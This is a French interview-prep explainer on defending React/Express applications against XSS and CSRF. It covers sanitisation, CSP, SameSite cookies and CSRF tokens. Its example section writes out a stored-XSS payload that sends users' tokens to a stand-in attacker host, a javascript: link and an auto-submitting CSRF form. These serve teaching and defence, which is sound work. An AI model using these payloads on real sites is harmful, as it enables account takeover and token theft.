# Comment protégez-vous les applications contre le XSS et le CSRF ?

**Niveau :** Mid
**Merged from (original phrasings):**
- Comment protégez-vous les applications contre le XSS et le CSRF ?

## The concept (short answer)
- **XSS (Cross-Site Scripting) :** un attaquant parvient à **faire exécuter son JavaScript dans votre origine**, par exemple via du contenu utilisateur rendu en HTML, une URL `javascript:` ou un script tiers compromis. Ce script peut faire tout ce que l'utilisateur peut faire : lire le DOM et les tokens non httpOnly, appeler vos API, siphonner les formulaires.
  - React échappe par défaut le texte placé dans `{}`. Les failles possibles : `dangerouslySetInnerHTML`, `href={userUrl}` (URL `javascript:`), les API DOM directes (`innerHTML`, `insertAdjacentHTML`), `eval`/`new Function`, et le SSR qui injecte du JSON non échappé dans un `<script>`.
  - Défenses : n'affichez pas de HTML brut. Si vous y êtes obligé, **assainissez-le avec DOMPurify**. Validez les schémas d'URL (`https:` uniquement). Ajoutez une **Content Security Policy** stricte (nonces, pas de `unsafe-inline`) comme seconde couche. Utilisez la **Subresource Integrity** sur les scripts tiers. Gardez les cookies de session en **httpOnly**.
- **CSRF (Cross-Site Request Forgery) :** un site malveillant fait envoyer par le **navigateur** de l'utilisateur une requête vers votre site, et le navigateur **joint automatiquement les cookies** : la requête est donc authentifiée. L'attaquant ne peut pas lire la réponse, mais il peut déclencher des changements d'état (virer de l'argent, changer l'e-mail).
  - Défenses : cookies **SameSite=Lax/Strict** (cookies non envoyés lors des POST cross-site), **tokens CSRF** (synchronizer ou double-submit) pour les méthodes non sûres, vérification de `Origin`/`Sec-Fetch-Site`, ne jamais modifier l'état sur un GET, et un CORS strict (ne jamais refléter n'importe quelle origine avec les credentials).
- Important : **le XSS contourne la protection CSRF** (un script dans votre propre origine peut lire le token CSRF), la prévention du XSS passe donc en premier.
- **Incidents réels :** en 2005, le **ver Samy** a exploité un XSS stocké dans les profils MySpace pour ajouter l'attaquant en ami et se recopier sur le profil de chaque visiteur, atteignant plus d'un million de profils en une journée environ. En 2018, l'**attaque Magecart contre British Airways** a modifié une bibliothèque JavaScript tierce (Modernizr) servie depuis le site même de BA pour qu'elle envoie les données de carte saisies sur la page de paiement vers un domaine de l'attaquant imitant celui de BA. Des centaines de milliers de clients ont été touchés et l'ICO britannique a infligé une amende de 20 M£ à BA. Une CSP stricte avec `connect-src` (qui bloque l'envoi de données vers des hôtes inconnus), des empreintes SRI sur les scripts et une surveillance des modifications de scripts sont précisément les défenses contre ce type d'attaque.

## Real-life example: the problem
Dans une application communautaire de partage de recettes, les utilisateurs rédigent la description de leurs recettes dans un éditeur de texte riche, et le HTML est enregistré tel quel. Un utilisateur publie une recette dont la description contient `<img src=x onerror="fetch('https://evil.example/c?t='+localStorage.token)">`. Chaque visiteur qui ouvre la recette envoie discrètement son token d'authentification à l'attaquant. La même application avait aussi un endpoint « changer d'e-mail » qui acceptait des POST authentifiés par cookie sans aucune protection CSRF : les attaquants pouvaient donc également cacher un formulaire à soumission automatique sur n'importe quel site.

```jsx
// XSS stocké : HTML utilisateur brut affiché
function RecipeDescription({ recipe }) {
  return <div dangerouslySetInnerHTML={{ __html: recipe.descriptionHtml }} />;
}

// URL non validée : <a href="javascript:alert(document.cookie)">
function AuthorLink({ author }) {
  return <a href={author.website}>{author.name}'s website</a>;
}
```

```html
<!-- Sur evil.example : CSRF via un formulaire soumis automatiquement (le cookie de session n'a pas de SameSite) -->
<form action="https://recipes.example.com/api/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example" />
</form>
<script>document.forms[0].submit()</script>
```

## How to fix it
**XSS : assainir, valider les URL, restreindre avec une CSP.**
```jsx
import DOMPurify from 'dompurify';

const ALLOWED = { ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'a', 'h3'],
                  ALLOWED_ATTR: ['href'] };

function RecipeDescription({ recipe }) {
  const clean = useMemo(() => DOMPurify.sanitize(recipe.descriptionHtml, ALLOWED), [recipe.descriptionHtml]);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

function safeUrl(url) {
  try {
    const u = new URL(url);
    return u.protocol === 'https:' || u.protocol === 'http:' ? u.href : undefined;
  } catch { return undefined; }
}

function AuthorLink({ author }) {
  const href = safeUrl(author.website);
  return href ? <a href={href} rel="noopener noreferrer nofollow" target="_blank">{author.name}'s website</a> : null;
}
```
Assainissez aussi côté serveur, au moment de l'enregistrement du contenu, pour que les autres clients (mobile, e-mails) soient eux aussi protégés.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random-per-request}' 'strict-dynamic';
  connect-src 'self' https://api.recipes.example.com;
  img-src 'self' https://cdn.recipes.example.com data:;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```
Même si une injection passe à travers les mailles, les handlers inline et les scripts sans le nonce ne s'exécuteront pas, et `connect-src` bloque l'envoi des données volées vers des domaines inconnus.

**CSRF : cookies SameSite + token + vérification de l'Origin.**
```js
res.cookie('sid', sessionId, { httpOnly: true, secure: true, sameSite: 'lax' });

app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const origin = req.get('Origin');
  if (origin && origin !== 'https://recipes.example.com') return res.sendStatus(403);
  if (req.get('X-CSRF-Token') !== req.session.csrfToken) return res.sendStatus(403);
  next();
});
```
```js
// client : envoyer le token (fourni dans une balise meta ou par un endpoint /csrf) avec les mutations
fetch('/api/account/email', {
  method: 'POST', credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ email }),
});
```

Pourquoi ça marche : DOMPurify supprime les gestionnaires d'événements, les `<script>` et les URL dangereuses tout en conservant la mise en forme sûre. La CSP est une seconde couche qui bloque ce qui passerait malgré tout. Pour le CSRF, le navigateur n'attache pas un cookie `SameSite=Lax` à un POST cross-site, et même s'il le faisait, la page de l'attaquant ne peut ni lire ni deviner le token CSRF, ni falsifier l'en-tête `Origin`.

Remarque : les Server Actions de Next.js comparent déjà `Origin` avec `Host` et n'acceptent que le POST, mais les Route Handlers personnalisés qui utilisent des cookies ont besoin de leurs propres vérifications.

## How to say it in the interview
- « Le XSS, c'est le code de l'attaquant qui s'exécute dans mon origine ; le CSRF, c'est le site de l'attaquant qui utilise les cookies de mon utilisateur. Des attaques différentes, des défenses différentes. »
- « React échappe par défaut, donc je surveille les échappatoires : `dangerouslySetInnerHTML`, les `href` contrôlés par l'utilisateur, les écritures directes dans le DOM et les scripts tiers. J'assainis avec DOMPurify et j'utilise une CSP à base de nonces et la SRI comme seconde couche. »
- Piège : « Nous utilisons un JWT dans localStorage, donc le CSRF ne nous concerne pas. » C'est vrai, mais désormais n'importe quel XSS vole le token. Avec des cookies httpOnly, vous échangez ce risque contre le CSRF, que SameSite et les tokens gèrent bien.
- Compromis : une CSP stricte peut casser les scripts inline et certains tags tiers. Déployez-la d'abord avec `Content-Security-Policy-Report-Only` et corrigez les violations avant de l'appliquer.
